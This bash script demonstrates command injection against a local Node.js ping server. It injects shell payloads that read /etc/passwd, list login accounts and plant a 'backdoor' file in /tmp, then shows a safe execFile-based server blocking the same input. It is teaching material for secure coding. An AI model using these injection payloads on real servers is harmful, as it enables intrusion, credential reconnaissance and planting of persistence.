#!/bin/bash
#
# Command injection exploit against vulnerable-server.js
# Demonstrates the PHF-style attack: inject shell commands via a ping endpoint.
#
# What this does:
#   1. Starts the vulnerable server
#   2. Uses command injection to steal /etc/passwd
#   3. Extracts real user accounts from the stolen data
#   4. Demonstrates escalation: writes a backdoor file to /tmp
#   5. Compares with the safe server to show the fix works

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SERVER_URL="http://localhost:3001"
VULN_SERVER="$SCRIPT_DIR/vulnerable-server.js"
SAFE_SERVER="$SCRIPT_DIR/safe-server.js"

cleanup() {
    [[ -n "$SERVER_PID" ]] && kill "$SERVER_PID" 2>/dev/null
    rm -f /tmp/backdoor_demo.txt
    wait "$SERVER_PID" 2>/dev/null
}
trap cleanup EXIT

wait_for_server() {
    local attempts=0
    while ! curl -s "$SERVER_URL/?host=localhost" >/dev/null 2>&1; do
        sleep 0.2
        ((attempts++))
        if [[ $attempts -gt 25 ]]; then
            echo "ERROR: Server did not start within 5 seconds."
            exit 1
        fi
    done
}

# ─────────────────────────────────────────────
echo "========================================="
echo "  Command Injection Exploit Demo"
echo "  (PHF-style attack on a Node.js server)"
echo "========================================="
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 1: Starting vulnerable server ==="
node "$VULN_SERVER" &
SERVER_PID=$!
wait_for_server
echo "Vulnerable server running (PID $SERVER_PID)"
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 2: Normal request (no injection) ==="
echo "> curl \"$SERVER_URL/?host=localhost\""
NORMAL_RESULT=$(curl -s "$SERVER_URL/?host=localhost" 2>&1 | head -5)
echo "$NORMAL_RESULT"
echo "... (normal ping output, nothing interesting)"
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 3: Command injection — steal /etc/passwd ==="
echo ""
echo "The server runs:  ping -c 1 \$HOST"
echo "We send:          host=localhost;cat /etc/passwd"
echo "Shell executes:   ping -c 1 localhost; cat /etc/passwd"
echo ""
echo "> curl \"$SERVER_URL/?host=localhost;cat%20/etc/passwd\""
STOLEN_DATA=$(curl -s "$SERVER_URL/?host=localhost;cat%20/etc/passwd" 2>&1)
echo "$STOLEN_DATA" | tail -20
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 4: Extracting real user accounts ==="
echo ""
echo "Parsing stolen /etc/passwd for accounts with login shells..."
echo ""

# Extract lines that have a real shell (not /usr/bin/false, /sbin/nologin, etc.)
REAL_USERS=$(echo "$STOLEN_DATA" | grep -v "^PING\|^ping\|bytes from\|packet\|round-trip\|^$" \
    | awk -F: '$NF ~ /(bash|zsh|sh|fish)$/ { printf "  %-15s uid=%-5s home=%s\n", $1, $3, $6 }')

if [[ -n "$REAL_USERS" ]]; then
    echo "Found accounts with login shells:"
    echo "$REAL_USERS"
else
    echo "(No accounts with standard login shells found — macOS may use directory services)"
    echo "But the attacker still sees the full file:"
    echo "$STOLEN_DATA" | grep -v "^PING\|^ping\|bytes from\|packet\|round-trip\|^$" | head -5
fi
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 5: Escalation — planting a backdoor file ==="
echo ""
echo "An attacker wouldn't stop at reading files."
echo "Injecting: host=localhost;echo 'BACKDOOR: attacker was here' > /tmp/backdoor_demo.txt"
echo ""
curl -s "$SERVER_URL/?host=localhost;echo%20'BACKDOOR:%20attacker%20was%20here'%20>%20/tmp/backdoor_demo.txt" >/dev/null 2>&1

if [[ -f /tmp/backdoor_demo.txt ]]; then
    echo "Backdoor file created! Contents:"
    echo "  $(cat /tmp/backdoor_demo.txt)"
    echo ""
    echo "In a real attack, this could be a web shell, a cron job,"
    echo "an SSH key in ~/.ssh/authorized_keys, or worse."
else
    echo "File write didn't work (permissions), but the command still executed."
fi
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 6: Stopping vulnerable server, starting safe server ==="
kill "$SERVER_PID" 2>/dev/null
wait "$SERVER_PID" 2>/dev/null
sleep 0.5

node "$SAFE_SERVER" &
SERVER_PID=$!
wait_for_server
echo "Safe server running (PID $SERVER_PID)"
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 7: Same attacks against the safe server ==="
echo ""
echo "Trying injection: host=localhost;cat /etc/passwd"
SAFE_RESULT=$(curl -s "$SERVER_URL/?host=localhost;cat%20/etc/passwd" 2>&1)
echo "$SAFE_RESULT" | head -5
echo ""

if echo "$SAFE_RESULT" | grep -q "root:"; then
    echo "FAIL: Safe server is still vulnerable!"
else
    echo "BLOCKED! The safe server (execFile) treats the injection as"
    echo "a literal hostname. ping tries to resolve 'localhost;cat /etc/passwd'"
    echo "as a single hostname, fails, and that's the end of it."
    echo ""
    echo "No shell was involved. No second command was executed."
fi
echo ""

# ─────────────────────────────────────────────
echo "========================================="
echo "  Summary"
echo "========================================="
echo ""
echo "  exec()     → user input parsed by shell → COMMAND INJECTION"
echo "  execFile() → user input passed as argv[] → safe, no shell"
echo ""
echo "  The fix is not sanitization. The fix is never giving"
echo "  user input to a shell in the first place."
echo "========================================="
